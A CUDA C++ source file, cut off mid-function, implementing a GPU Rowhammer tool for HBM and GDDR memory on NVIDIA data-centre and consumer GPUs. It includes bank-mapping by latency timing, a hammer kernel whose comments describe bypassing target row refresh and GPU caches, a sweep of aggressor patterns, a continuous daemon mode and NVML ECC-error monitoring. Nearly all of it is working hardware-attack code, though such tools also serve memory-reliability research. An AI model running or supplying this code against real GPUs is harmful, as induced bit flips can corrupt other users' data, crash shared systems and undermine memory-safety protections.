// gpu_hammer.cu – GPU Rowhammer ECC error trigger
// Implements GPUHammer paper techniques for HBM and GDDR memory.
// Supports: A100 (HBM2e), H100/H800 (HBM3), H200 (HBM3e),
//           A6000/RTX30xx (GDDR6), RTX40xx/L40 (GDDR6X)

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <csignal>
#include <cstdarg>
#include <climits>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

#include <cuda.h>
#include <cuda_runtime.h>
#include <nvml.h>

#include <vector>
#include <string>
#include <algorithm>
#include <thread>
#include <mutex>
#include <atomic>

// ===================================================================
// Macros and globals
// ===================================================================

#define CUDA_CHECK(call) do {                                         \
    cudaError_t _e = (call);                                          \
    if (_e != cudaSuccess) {                                          \
        fprintf(stderr, "[CUDA] %s:%d %s -> %s\n",                   \
                __FILE__, __LINE__, #call, cudaGetErrorString(_e));    \
        exit(EXIT_FAILURE);                                           \
    }                                                                 \
} while (0)

static volatile sig_atomic_t g_stop = 0;
static void on_signal(int) { g_stop = 1; }

static double now_sec() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec + tv.tv_usec * 1e-6;
}

// ===================================================================
// Thread-safe Logger (stdout + file)
// ===================================================================

class Logger {
    FILE *fp_ = nullptr;
    std::mutex mtx_;

    static const char *ts() {
        static thread_local char buf[64];
        time_t t = time(nullptr);
        struct tm *tm = localtime(&t);
        strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", tm);
        return buf;
    }

public:
    bool open(const char *path) {
        fp_ = fopen(path, "w");
        return fp_ != nullptr;
    }

    // gpu_id < 0 means no GPU prefix (global message)
    void log(int gpu_id, const char *fmt, ...) {
        std::lock_guard<std::mutex> lk(mtx_);
        char prefix[64];
        if (gpu_id >= 0)
            snprintf(prefix, sizeof(prefix), "[GPU%d] ", gpu_id);
        else
            prefix[0] = '\0';

        va_list ap;
        fputs(prefix, stdout);
        va_start(ap, fmt);
        vfprintf(stdout, fmt, ap);
        va_end(ap);

        if (fp_) {
            fprintf(fp_, "[%s]%s", ts(), prefix);
            va_start(ap, fmt);
            vfprintf(fp_, fmt, ap);
            va_end(ap);
            fflush(fp_);
        }
    }

    void close() {
        if (fp_) { fclose(fp_); fp_ = nullptr; }
    }
};

// ===================================================================
// Memory Profile – explicit HBM / GDDR characterization
// ===================================================================

enum MemType { MEM_HBM2E, MEM_HBM3, MEM_HBM3E, MEM_GDDR6, MEM_GDDR6X, MEM_UNKNOWN };

struct MemoryProfile {
    MemType     type;
    const char *type_name;
    int  stacks;               // HBM die stacks (0 for GDDR)
    int  channels_per_stack;   // pseudo-channels (HBM2e:8, HBM3:16)
    int  total_channels;
    int  banks_per_channel;
    int  total_banks;
    int  row_size_bytes;
    int  rows_per_bank;
    int  interleave_bytes;     // bank interleaving granularity
    int  t_refi_ns;            // refresh interval
    int  t_rc_ns;              // row cycle time
    int  t_refw_ms;            // full refresh window
    bool has_on_die_ecc;       // on-die ECC present (HBM2e+)
    int  sync_delay;           // default sync delay for REF alignment
    int  default_rounds;       // ACT rounds per sync window
    int  default_banks_to_test;
    size_t stride_hint;        // starting stride for same-bank detection
};

static MemoryProfile detect_memory_profile(const cudaDeviceProp &prop) {
    MemoryProfile p{};
    const char *name = prop.name;
    int bus_w = prop.memoryBusWidth;

    // ---- HBM2e: A100 family ----
    if (strstr(name, "A100")) {
        p = { MEM_HBM2E, "HBM2e",
              /*stacks*/ 5, /*ch/stack*/ 8, /*tot_ch*/ 40,
              /*banks/ch*/ 16, /*tot_banks*/ 640,
              /*row_sz*/ 1024, /*rows/bank*/ 32768,
              /*interleave*/ 256,
              /*tREFI*/ 3900, /*tRC*/ 46, /*tREFW*/ 32,
              /*on_die_ecc*/ true,
              /*sync_delay*/ 8, /*rounds*/ 64, /*test_banks*/ 16,
              /*stride_hint*/ 32768 };
    }
    // ---- HBM3: H100 / H800 ----
    else if (strstr(name, "H100") || strstr(name, "H800")) {
        p = { MEM_HBM3, "HBM3",
              5, 16, 80,
              16, 1280,
              1024, 32768,
              256,
              3900, 36, 32,
              true,
              8, 80, 16,
              65536 };
    }
    // ---- HBM3e: H200, B100, B200 ----
    else if (strstr(name, "H200")) {
        p = { MEM_HBM3E, "HBM3e",
              6, 16, 96,
              16, 1536,
              1024, 32768,
              256,
              3900, 36, 32,
              true,
              8, 80, 16,
              65536 };
    }
    else if (strstr(name, "B100") || strstr(name, "B200") ||
             strstr(name, "GB200")) {
        p = { MEM_HBM3E, "HBM3e",
              8, 16, 128,
              16, 2048,
              1024, 32768,
              256,
              3900, 36, 32,
              true,
              8, 80, 16,
              131072 };
    }
    // ---- GDDR6: A6000, RTX 30xx ----
    else if (strstr(name, "A6000") || strstr(name, "RTX 30") ||
             strstr(name, "RTX 3")) {
        int chips = bus_w / 32;
        p = { MEM_GDDR6, "GDDR6",
              0, 0, chips * 2,
              16, chips * 2 * 16,
              2048, 65536,
              256,
              1407, 45, 23,
              false,
              8, 48, 8,
              4096 };
    }
    // ---- GDDR6X: RTX 40xx, L40, A40 ----
    else if (strstr(name, "RTX 40") || strstr(name, "RTX 4") ||
             strstr(name, "L40") || strstr(name, "A40")) {
        int chips = bus_w / 32;
        p = { MEM_GDDR6X, "GDDR6X",
              0, 0, chips,
              16, chips * 16,
              2048, 65536,
              256,
              1407, 45, 32,
              false,
              8, 48, 8,
              4096 };
    }
    // ---- Unknown – conservative defaults ----
    else {
        int chips = std::max(1, bus_w / 32);
        p = { MEM_UNKNOWN, "Unknown",
              0, 0, chips,
              16, chips * 16,
              2048, 32768,
              256,
              3900, 46, 32,
              false,
              10, 32, 8,
              16384 };
    }
    return p;
}

static void print_memory_profile(const MemoryProfile &p, Logger &log, int gpu) {
    log.log(gpu, "  Memory type:  %s\n", p.type_name);
    if (p.stacks > 0) {
        log.log(gpu, "  3D structure: %d stacks x %d channels/stack "
                     "= %d pseudo-channels\n",
                p.stacks, p.channels_per_stack, p.total_channels);
        log.log(gpu, "  Banks:        %d/channel x %d channels = %d total\n",
                p.banks_per_channel, p.total_channels, p.total_banks);
    } else {
        log.log(gpu, "  Channels:     %d   Banks: %d total\n",
                p.total_channels, p.total_banks);
    }
    log.log(gpu, "  Row:          %d bytes x %d rows/bank\n",
            p.row_size_bytes, p.rows_per_bank);
    log.log(gpu, "  Timing:       tREFI=%dns  tRC=%dns  tREFW=%dms\n",
            p.t_refi_ns, p.t_rc_ns, p.t_refw_ms);
    log.log(gpu, "  On-die ECC:   %s\n", p.has_on_die_ecc ? "yes" : "no");
}

// ===================================================================
// Configuration
// ===================================================================

struct Config {
    std::vector<int> gpus;     // GPU IDs to test (empty = auto)
    bool all_gpus      = false;
    int n_sided        = 32;
    int distance       = 2;
    int duration_ms    = 500;
    int k_warps        = 8;
    int m_threads      = 0;
    int rounds         = 0;       // 0 = auto from profile
    int sync_delay     = 0;       // 0 = auto from profile
    int num_banks      = 0;       // 0 = auto from profile
    int max_iters      = 0;
    bool daemon        = false;
    bool sweep         = false;
    int cooldown       = 5;
    uint8_t victim     = 0xAA;
    uint8_t aggressor  = 0x55;
    size_t stride      = 0;
    size_t reserve_mb  = 128;
    int scan_samples   = 30;
    bool verbose       = false;
    std::string log_path;
};

static void usage(const char *prog) {
    printf(
        "GPU Rowhammer – ECC Error Trigger\n\n"
        "Usage: %s [options]\n\n"
        "GPU:\n"
        "  --gpu ID|all|0,1,2   GPU selection (default: all)\n\n"
        "Hammering:\n"
        "  --pattern N          N-sided aggressor pattern (default: 32)\n"
        "  --distance D         Row distance between aggressors (default: 2)\n"
        "  --duration MS        Hammer time per position in ms (default: 500)\n"
        "  --warps K            Number of warps (default: 8)\n"
        "  --threads M          Threads per warp (0=auto, default: 0)\n"
        "  --rounds R           ACTs per sync window (0=auto)\n"
        "  --sync-delay D       Delay iterations for REF sync (0=auto)\n\n"
        "Mapping:\n"
        "  --stride BYTES       Manual same-bank stride (0=auto)\n"
        "  --banks N            Banks to test (0=auto from memory type)\n"
        "  --reserve MB         Memory to leave free in MB (default: 128)\n\n"
        "Data:\n"
        "  --victim HEX         Victim byte pattern (default: 0xAA)\n"
        "  --aggressor HEX      Aggressor byte pattern (default: 0x55)\n\n"
        "Execution:\n"
        "  --iterations N       Max positions per bank (0=all)\n"
        "  --daemon             Continuous mode with auto-restart\n"
        "  --sweep              Sweep multiple patterns and data values\n"
        "  --cooldown SEC       Pause between daemon runs (default: 5)\n\n"
        "Output:\n"
        "  --log FILE           Log file path (default: gpu_hammer_<time>.log)\n"
        "  --verbose            Verbose output\n"
        "  --help               This message\n",
        prog);
}

static Config parse_args(int argc, char **argv) {
    Config c;
    for (int i = 1; i < argc; i++) {
        auto next = [&]() -> const char * {
            if (i + 1 >= argc) {
                fprintf(stderr, "Missing value for %s\n", argv[i]);
                exit(1);
            }
            return argv[++i];
        };
        if      (!strcmp(argv[i], "--gpu")) {
            const char *v = next();
            if (!strcmp(v, "all")) {
                c.all_gpus = true;
            } else {
                char *dup = strdup(v);
                char *tok = strtok(dup, ",");
                while (tok) {
                    c.gpus.push_back(atoi(tok));
                    tok = strtok(nullptr, ",");
                }
                free(dup);
            }
        }
        else if (!strcmp(argv[i], "--pattern"))     c.n_sided = atoi(next());
        else if (!strcmp(argv[i], "--distance"))    c.distance = atoi(next());
        else if (!strcmp(argv[i], "--duration"))    c.duration_ms = atoi(next());
        else if (!strcmp(argv[i], "--warps"))       c.k_warps = atoi(next());
        else if (!strcmp(argv[i], "--threads"))     c.m_threads = atoi(next());
        else if (!strcmp(argv[i], "--rounds"))      c.rounds = atoi(next());
        else if (!strcmp(argv[i], "--sync-delay"))  c.sync_delay = atoi(next());
        else if (!strcmp(argv[i], "--banks"))       c.num_banks = atoi(next());
        else if (!strcmp(argv[i], "--iterations"))  c.max_iters = atoi(next());
        else if (!strcmp(argv[i], "--daemon"))      c.daemon = true;
        else if (!strcmp(argv[i], "--sweep"))       c.sweep = true;
        else if (!strcmp(argv[i], "--cooldown"))    c.cooldown = atoi(next());
        else if (!strcmp(argv[i], "--victim"))      c.victim = (uint8_t)strtoul(next(), nullptr, 16);
        else if (!strcmp(argv[i], "--aggressor"))   c.aggressor = (uint8_t)strtoul(next(), nullptr, 16);
        else if (!strcmp(argv[i], "--stride"))      c.stride = strtoul(next(), nullptr, 0);
        else if (!strcmp(argv[i], "--reserve"))     c.reserve_mb = strtoul(next(), nullptr, 0);
        else if (!strcmp(argv[i], "--scan-samples"))c.scan_samples = atoi(next());
        else if (!strcmp(argv[i], "--log"))         c.log_path = next();
        else if (!strcmp(argv[i], "--verbose"))     c.verbose = true;
        else if (!strcmp(argv[i], "--help"))        { usage(argv[0]); exit(0); }
        else { fprintf(stderr, "Unknown option: %s\n", argv[i]); exit(1); }
    }
    if (c.m_threads == 0) {
        c.m_threads = c.n_sided / c.k_warps;
        if (c.n_sided % c.k_warps != 0) {
            c.m_threads++;
            c.n_sided = c.k_warps * c.m_threads;
        }
    }
    if (c.log_path.empty()) {
        char buf[128];
        time_t t = time(nullptr);
        struct tm *tm = localtime(&t);
        strftime(buf, sizeof(buf), "gpu_hammer_%Y%m%d_%H%M%S.log", tm);
        c.log_path = buf;
    }
    return c;
}

// ===================================================================
// ECC Monitor (NVML)
// ===================================================================

struct ECCSnap {
    unsigned long long corr_vol = 0, uncorr_vol = 0;
    unsigned long long corr_agg = 0, uncorr_agg = 0;
    unsigned int gpu_temp = 0;
    bool ok = false;
};

struct ECCMon {
    nvmlDevice_t dev{};
    bool ready = false;

    bool init(int gpu) {
        if (nvmlDeviceGetHandleByIndex_v2(gpu, &dev) != NVML_SUCCESS)
            return false;
        ready = true;
        return true;
    }

    ECCSnap snap() {
        ECCSnap s;
        if (!ready) return s;
        nvmlReturn_t r;
        r = nvmlDeviceGetMemoryErrorCounter(dev,
                NVML_MEMORY_ERROR_TYPE_CORRECTED,
                NVML_VOLATILE_ECC,
                NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.corr_vol);
        if (r != NVML_SUCCESS)
            nvmlDeviceGetTotalEccErrors(dev,
                    NVML_MEMORY_ERROR_TYPE_CORRECTED,
                    NVML_VOLATILE_ECC, &s.corr_vol);
        r = nvmlDeviceGetMemoryErrorCounter(dev,
                NVML_MEMORY_ERROR_TYPE_UNCORRECTED,
                NVML_VOLATILE_ECC,
                NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.uncorr_vol);
        if (r != NVML_SUCCESS)
            nvmlDeviceGetTotalEccErrors(dev,
                    NVML_MEMORY_ERROR_TYPE_UNCORRECTED,
                    NVML_VOLATILE_ECC, &s.uncorr_vol);
        nvmlDeviceGetMemoryErrorCounter(dev,
                NVML_MEMORY_ERROR_TYPE_CORRECTED,
                NVML_AGGREGATE_ECC,
                NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.corr_agg);
        nvmlDeviceGetMemoryErrorCounter(dev,
                NVML_MEMORY_ERROR_TYPE_UNCORRECTED,
                NVML_AGGREGATE_ECC,
                NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.uncorr_agg);
        nvmlDeviceGetTemperature(dev, NVML_TEMPERATURE_GPU, &s.gpu_temp);
        s.ok = true;
        return s;
    }

    bool has_new(const ECCSnap &a, const ECCSnap &b) {
        if (!a.ok || !b.ok) return false;
        return b.corr_vol > a.corr_vol || b.uncorr_vol > a.uncorr_vol;
    }
};

static void log_ecc(Logger &log, int gpu, const ECCSnap &s) {
    if (!s.ok) { log.log(gpu, "  ECC: unavailable\n"); return; }
    log.log(gpu, "  ECC volatile:  SBE=%llu  DBE=%llu\n",
            s.corr_vol, s.uncorr_vol);
    log.log(gpu, "  ECC aggregate: SBE=%llu  DBE=%llu\n",
            s.corr_agg, s.uncorr_agg);
    log.log(gpu, "  GPU temp: %uC\n", s.gpu_temp);
}

static void log_ecc_diff(Logger &log, int gpu,
                         const ECCSnap &a, const ECCSnap &b) {
    if (!a.ok || !b.ok) return;
    long long dc = (long long)(b.corr_vol - a.corr_vol);
    long long du = (long long)(b.uncorr_vol - a.uncorr_vol);
    if (dc > 0 || du > 0)
        log.log(gpu, "  >>> NEW ECC ERRORS <<<\n");
    log.log(gpu, "  Correctable:   +%lld\n", dc);
    log.log(gpu, "  Uncorrectable: +%lld\n", du);
}

// ===================================================================
// CUDA Kernels
// ===================================================================

__global__ void kern_single_lat(volatile uint8_t *base, size_t off,
                                uint32_t *out, int samples) {
    uint64_t d;
    volatile uint8_t *a = base + off;
    uint32_t tot = 0;
    for (int s = 0; s < samples; s++) {
        asm volatile("discard.global.L2 [%0], 128;" :: "l"(a));
        __threadfence();
        uint32_t t0 = clock();
        asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(a));
        uint32_t t1 = clock();
        tot += t1 - t0;
    }
    *out = tot / samples;
}

__global__ void kern_pair_lat(volatile uint8_t *base, size_t ref_off,
                              const size_t *offs, uint32_t *lats,
                              int n, int samples) {
    uint64_t d;
    volatile uint8_t *ref = base + ref_off;
    for (int c = 0; c < n; c++) {
        volatile uint8_t *tst = base + offs[c];
        uint32_t tot = 0;
        for (int s = 0; s < samples; s++) {
            asm volatile("discard.global.L2 [%0], 128;" :: "l"(ref));
            asm volatile("discard.global.L2 [%0], 128;" :: "l"(tst));
            __threadfence();
            uint32_t t0 = clock();
            asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(ref));
            asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(tst));
            uint32_t t1 = clock();
            tot += t1 - t0;
        }
        lats[c] = tot / samples;
    }
}

__global__ void kern_fill(uint8_t *mem, size_t n, uint8_t val) {
    size_t i = (size_t)blockIdx.x * blockDim.x + threadIdx.x;
    size_t s = (size_t)blockDim.x * gridDim.x;
    for (; i < n; i += s) mem[i] = val;
}

// Aggressive rowhammer kernel with double-sided ACT pattern and TRR bypass.
//
// HBM protection bypass techniques used here:
//  1. Double-sided: each thread alternates loads between two different rows
//     (a1, a2) in the same bank.  The MC must PRE one row to ACT the other,
//     guaranteeing an ACT-PRE cycle on every single load instruction.
//  2. High activation density: reduced sync_delay and high rounds count
//     saturate the bank near the tRC physical limit (~84 ACTs/tREFI for
//     HBM2e, ~108 for HBM3).
//  3. TRR overflow: n_sided >= 32 activates more distinct rows than TRR's
//     limited tracking table can hold, leaving some aggressor-adjacent
//     victim rows un-refreshed.
//  4. L2 eviction (discard.global.L2) + volatile loads bypass all GPU caches
//     and force DRAM-level row activations.
//  5. Multi-block launch (2 blocks on different SMs) creates cross-SM L2
//     interference: one block's discard evicts the other block's cached data,
//     increasing the L2 miss rate and thus DRAM ACT count.
__global__ void kern_hammer(volatile uint8_t * const *addrs,
                            int k, int m, int rounds,
                            int sync_delay, uint64_t dur_ns) {
    uint64_t d, ds = 0;
    int wid = threadIdx.x >> 5;
    int lid = threadIdx.x & 31;
    bool active = (wid < k && lid < m);

    volatile uint8_t *a1 = nullptr;
    volatile uint8_t *a2 = nullptr;
    if (active) {
        int base_idx = wid * m;
        a1 = addrs[base_idx + lid];
        a2 = (m > 1) ? addrs[base_idx + (lid + 1) % m]
                      : addrs[((wid + 1) % k) * m];
        asm volatile("discard.global.L2 [%0], 128;" :: "l"(a1));
        asm volatile("discard.global.L2 [%0], 128;" :: "l"(a2));
    }
    __syncthreads();
    if (!active) return;

    uint64_t t_start;
    asm volatile("mov.u64 %0, %%globaltimer;" : "=l"(t_start));
    uint64_t t_end = t_start + dur_ns;

    for (;;) {
        for (int c = 0; c < 256; c++) {
            for (int r = 0; r < rounds; r++) {
                asm volatile("discard.global.L2 [%0], 128;" :: "l"(a1));
                asm volatile("ld.u64.global.volatile %0, [%1];"
                             : "=l"(d) : "l"(a1));
                asm volatile("discard.global.L2 [%0], 128;" :: "l"(a2));
                asm volatile("ld.u64.global.volatile %0, [%1];"
                             : "=l"(d) : "l"(a2));
                __threadfence();
            }
            for (int i = 0; i < sync_delay; i++)
                ds += d;
        }
        uint64_t t_now;
        asm volatile("mov.u64 %0, %%globaltimer;" : "=l"(t_now));
        if (t_now >= t_end) break;
    }
    if (ds == 0xCAFEBABEDEADBEEFULL)
        const_cast<volatile uint8_t **>(addrs)[0] = (volatile uint8_t *)ds;
}

// ===================================================================
// Host helpers
// ===================================================================

static void gpu_fill(uint8_t *d, size_t n, uint8_t v) {
    int thr = 256;
    int blk = (int)std::min((size_t)65535, (n + thr - 1) / thr);
    kern_fill<<<blk, thr>>>(d, n, v);
    CUDA_CHECK(cudaDeviceSynchronize());
}

// ===================================================================
// Bank / Row Mapping
// ===================================================================

struct BankMap {
    size_t ref_offset;
    int    stack_id;      // estimated HBM stack (-1 if unknown)
    int    channel_id;    // estimated channel (-1 if unknown)
    std::vector<size_t> rows;
};

static uint32_t single_lat(uint8_t *base, size_t off, int samp) {
    uint32_t *d_l;
    CUDA_CHECK(cudaMalloc(&d_l, 4));
    kern_single_lat<<<1, 1>>>((volatile uint8_t *)base, off, d_l, samp);
    CUDA_CHECK(cudaDeviceSynchronize());
    uint32_t h;
    CUDA_CHECK(cudaMemcpy(&h, d_l, 4, cudaMemcpyDeviceToHost));
    CUDA_CHECK(cudaFree(d_l));
    return h;
}

// Detect stride using the memory profile's hint and nearby candidates
static size_t detect_stride(uint8_t *base, size_t sz,
                            const MemoryProfile &mp,
                            int samp, Logger &log, int gpu, bool verbose) {
    uint32_t ref_lat = single_lat(base, 0, samp);
    uint32_t thr = ref_lat + ref_lat / 6;

    if (verbose)
        log.log(gpu, "  Ref latency: %u cyc, conflict threshold: %u\n",
                ref_lat, thr);

    // Build candidate list: the profile hint plus powers-of-two around it
    std::vector<size_t> cands;
    for (size_t s = 256; s <= 4 * 1024 * 1024; s *= 2)
        cands.push_back(s);
    if (std::find(cands.begin(), cands.end(), mp.stride_hint) == cands.end())
        cands.push_back(mp.stride_hint);
    // For HBM, add total_banks * interleave as a candidate
    if (mp.stacks > 0) {
        size_t hbm_full = (size_t)mp.total_banks * mp.interleave_bytes;
        if (std::find(cands.begin(), cands.end(), hbm_full) == cands.end())
            cands.push_back(hbm_full);
    }
    std::sort(cands.begin(), cands.end());

    size_t *d_off;
    uint32_t *d_lat;
    CUDA_CHECK(cudaMalloc(&d_off, 8));
    CUDA_CHECK(cudaMalloc(&d_lat, 4));

    size_t best = 0;
    float best_rate = 0;

    for (size_t stride : cands) {
        if (stride >= sz) continue;
        int hits = 0, tests = 0;
        for (int m = 1; m <= 20 && (size_t)m * stride < sz; m++) {
            size_t o = (size_t)m * stride;
            CUDA_CHECK(cudaMemcpy(d_off, &o, 8, cudaMemcpyHostToDevice));
            kern_pair_lat<<<1, 1>>>((volatile uint8_t *)base, 0,
                                    d_off, d_lat, 1, samp);
            CUDA_CHECK(cudaDeviceSynchronize());
            uint32_t l;
            CUDA_CHECK(cudaMemcpy(&l, d_lat, 4, cudaMemcpyDeviceToHost));
            tests++;
            if (l > thr) hits++;
        }
        float rate = (float)hits / tests;
        if (verbose)
            log.log(gpu, "  stride %9zu: conflict %.0f%%\n", stride, rate*100);
        if (rate > best_rate && rate > 0.5) {
            best = stride;
            best_rate = rate;
        }
    }

    CUDA_CHECK(cudaFree(d_off));
    CUDA_CHECK(cudaFree(d_lat));
    return best;
}

// For HBM: estimate which stack and channel a bank's reference address
// belongs to, based on interleaving pattern.
static void estimate_hbm_location(BankMap &bm, const MemoryProfile &mp) {
    if (mp.stacks <= 0) { bm.stack_id = -1; bm.channel_id = -1; return; }
    size_t bank_idx = bm.ref_offset / mp.interleave_bytes;
    int ch = (int)(bank_idx % mp.total_channels);
    bm.channel_id = ch;
    bm.stack_id = ch / mp.channels_per_stack;
}

static std::vector<BankMap> build_banks_stride(
        uint8_t *base, size_t sz, size_t stride,
        int num_banks, const MemoryProfile &mp,
        Logger &log, int gpu, bool verbose) {
    std::vector<BankMap> banks;
    for (int b = 0; b < num_banks; b++) {
        BankMap bm;
        bm.ref_offset = (size_t)b * mp.interleave_bytes;
        estimate_hbm_location(bm, mp);
        int max_rows = (int)(sz / stride);
        if (max_rows > 65536) max_rows = 65536;
        for (int r = 0; r < max_rows; r++) {
            size_t o = bm.ref_offset + (size_t)r * stride;
            if (o >= sz) break;
            bm.rows.push_back(o);
        }
        banks.push_back(bm);
        if (verbose) {
            if (bm.stack_id >= 0)
                log.log(gpu, "  Bank %d: %zu rows  "
                        "stack=%d ch=%d\n",
                        b, bm.rows.size(), bm.stack_id, bm.channel_id);
            else
                log.log(gpu, "  Bank %d: %zu rows\n",
                        b, bm.rows.size());
        }
    }
    return banks;
}

static std::vector<BankMap> build_banks_timing(
        uint8_t *base, size_t sz, int num_banks,
        const MemoryProfile &mp, int samples,
        Logger &log, int gpu, bool verbose) {
    const int BATCH = 2048;
    size_t scan_step = mp.interleave_bytes;
    size_t *d_offs;
    uint32_t *d_lats;
    CUDA_CHECK(cudaMalloc(&d_offs, BATCH * 8));
    CUDA_CHECK(cudaMalloc(&d_lats, BATCH * 4));
    std::vector<size_t> h_offs(BATCH);
    std::vector<uint32_t> h_lats(BATCH);

    std::vector<BankMap> banks;

    for (int b = 0; b < num_banks && !g_stop; b++) {
        size_t ref = (size_t)b * (sz / num_banks);
        ref = (ref / scan_step) * scan_step;

        uint32_t ref_lat = single_lat(base, ref, samples);
        uint32_t thr = ref_lat + ref_lat / 6;

        if (verbose)
            log.log(gpu, "  Bank %d: ref=0x%lx lat=%u scanning...\n",
                    b, (unsigned long)ref, ref_lat);

        BankMap bm;
        bm.ref_offset = ref;
        estimate_hbm_location(bm, mp);
        size_t total = sz / scan_step;
        size_t done = 0;

        for (size_t pos = 0; pos < sz && !g_stop;) {
            int n = 0;
            for (; pos < sz && n < BATCH; pos += scan_step) {
                if (pos == ref) continue;
                h_offs[n++] = pos;
            }
            if (n == 0) break;
            CUDA_CHECK(cudaMemcpy(d_offs, h_offs.data(), n*8,
                                  cudaMemcpyHostToDevice));
            kern_pair_lat<<<1,1>>>((volatile uint8_t*)base, ref,
                                   d_offs, d_lats, n, samples);
            CUDA_CHECK(cudaDeviceSynchronize());
            CUDA_CHECK(cudaMemcpy(h_lats.data(), d_lats, n*4,
                                  cudaMemcpyDeviceToHost));
            for (int i = 0; i < n; i++)
                if (h_lats[i] > thr) bm.rows.push_back(h_offs[i]);
            done += n;
            if (verbose && done % (BATCH * 20) == 0)
                log.log(gpu, "    Scan %.1f%% - %zu conflicts\n",
                        100.0 * done / total, bm.rows.size());
        }
        if (verbose)
            log.log(gpu, "\n    Found %zu same-bank addresses\n",
                    bm.rows.size());
        std::sort(bm.rows.begin(), bm.rows.end());
        banks.push_back(bm);
    }

    CUDA_CHECK(cudaFree(d_offs));
    CUDA_CHECK(cudaFree(d_lats));
    return banks;
}

// ===================================================================
// Sweep table
// ===================================================================

struct SweepEntry {
    int n_sided; int distance;
    uint8_t victim, aggressor;
    const char *label;
};

static const SweepEntry SWEEP_TABLE[] = {
    // Double-sided (d=2): victims sandwiched between aggressors
    {32, 2, 0xAA, 0x55, "32-sided d2 AA/55"},
    {32, 2, 0x55, 0xAA, "32-sided d2 55/AA"},
    {32, 2, 0xFF, 0x00, "32-sided d2 FF/00"},
    {32, 2, 0x00, 0xFF, "32-sided d2 00/FF"},
    // High n_sided for TRR table overflow
    {48, 2, 0xAA, 0x55, "48-sided d2 AA/55"},
    {48, 2, 0x55, 0xAA, "48-sided d2 55/AA"},
    {64, 2, 0xAA, 0x55, "64-sided d2 AA/55"},
    // Distance 4: victims outside TRR refresh range
    {32, 4, 0xAA, 0x55, "32-sided d4 AA/55"},
    {32, 4, 0x55, 0xAA, "32-sided d4 55/AA"},
    // Lower n_sided for denser per-row activation
    {24, 2, 0xAA, 0x55, "24-sided d2 AA/55"},
    {24, 2, 0x55, 0xAA, "24-sided d2 55/AA"},
    {16, 2, 0xAA, 0x55, "16-sided d2 AA/55"},
};
static const int SWEEP_COUNT = sizeof(SWEEP_TABLE) / sizeof(SWEEP_TABLE[0]);

// ===================================================================
// Hammer Campaign
// ===================================================================

struct CampaignStats {
    std::atomic<int> ecc_events{0};
    std::atomic<int> bitflips{0};
};

static void run_campaign(
        uint8_t *d_mem, size_t mem_sz,
        const std::vector<BankMap> &banks,
        const MemoryProfile &mp,
        int n_sided, int distance,
        uint8_t victim_pat, uint8_t aggr_pat,
        int k_warps, int m_threads,
        int rounds, int sync_delay,
        int duration_ms, int max_iters,
        bool verbose, ECCMon &ecc,
        CampaignStats &stats, Logger &log, int gpu) {

    if (n_sided != k_warps * m_threads) {
        m_threads = n_sided / k_warps;
        if (n_sided % k_warps != 0) {
            m_threads++;
            n_sided = k_warps * m_threads;
        }
    }

    log.log(gpu, "Campaign config:\n");
    log.log(gpu, "  Pattern:  %d-sided  distance=%d\n", n_sided, distance);
    log.log(gpu, "  Data:     victim=0x%02X  aggressor=0x%02X\n",
            victim_pat, aggr_pat);
    log.log(gpu, "  Kernel:   warps=%d  threads/warp=%d  rounds=%d  sync_delay=%d\n",
            k_warps, m_threads, rounds, sync_delay);
    log.log(gpu, "  Duration: %d ms  (multi-block: 2)\n", duration_ms);

    ECCSnap ecc0 = ecc.snap();

    log.log(gpu, "  Filling %.1f GB with victim 0x%02X...\n",
            mem_sz / 1e9, victim_pat);
    gpu_fill(d_mem, mem_sz, victim_pat);

    uint64_t dur_ns = (uint64_t)duration_ms * 1000000ULL;
    int positions_total = 0;

    for (int bi = 0; bi < (int)banks.size() && !g_stop; bi++) {
        const BankMap &bk = banks[bi];
        int nrows = (int)bk.rows.size();
        int span = n_sided * distance;

        if (nrows < span) {
            if (verbose)
                log.log(gpu, "  Bank %d: skip (%d < %d)\n", bi, nrows, span);
            continue;
        }

        int max_pos = nrows - span;
        int limit = (max_iters > 0)
                    ? std::min(max_iters, max_pos + 1) : max_pos + 1;
        int tested = 0;

        for (int pos = 0; pos <= max_pos && tested < limit && !g_stop;
             pos += 3, tested++) {

            positions_total++;

            std::vector<volatile uint8_t *> h_addrs(n_sided);
            std::vector<size_t> agg_offs(n_sided);
            bool valid = true;
            for (int i = 0; i < n_sided; i++) {
                int ri = pos + i * distance;
                if (ri >= nrows) { valid = false; break; }
                agg_offs[i] = bk.rows[ri];
                h_addrs[i] = (volatile uint8_t *)(d_mem + bk.rows[ri]);
            }
            if (!valid) break;

            for (int i = 0; i < n_sided; i++)
                gpu_fill(d_mem + agg_offs[i], 256, aggr_pat);

            void *d_addrs_raw;
            CUDA_CHECK(cudaMalloc(&d_addrs_raw, n_sided * sizeof(void *)));
            CUDA_CHECK(cudaMemcpy(d_addrs_raw, h_addrs.data(),
                                  n_sided * sizeof(void *),
                                  cudaMemcpyHostToDevice));

            ECCSnap e0 = ecc.snap();

            int total_threads = k_warps * 32;
            if (total_threads > 1024) total_threads = 1024;
            kern_hammer<<<2, total_threads>>>(
                    (volatile uint8_t *const *)d_addrs_raw,
                    k_warps, m_threads, rounds, sync_delay, dur_ns);
            CUDA_CHECK(cudaDeviceSynchronize());

            CUDA_CHECK(cudaFree(d_addrs_raw));

            ECCSnap e1 = ecc.snap();
            if (ecc.has_new(e0, e1)) {
                log.log(gpu, "  !!!! ECC ERROR !!!!\n");
                log.log(gpu, "  Bank %d  pos %d  temp %uC\n",
                        bi, pos, e1.gpu_temp);
                log_ecc_diff(log, gpu, e0, e1);
                stats.ecc_events++;
            }

            // Check victim rows adjacent to aggressors
            {
                int first_ri = pos;
                int last_ri = pos + (n_sided - 1) * distance;
                int lo = std::max(0, first_ri - 6);
                int hi = std::min(nrows - 1, last_ri + 6);
                uint8_t buf[256];

                for (int vi = lo; vi <= hi; vi++) {
                    int diff = vi - pos;
                    if (diff >= 0 && diff <= (n_sided-1)*distance
                        && diff % distance == 0)
                        continue;

                    size_t voff = bk.rows[vi];
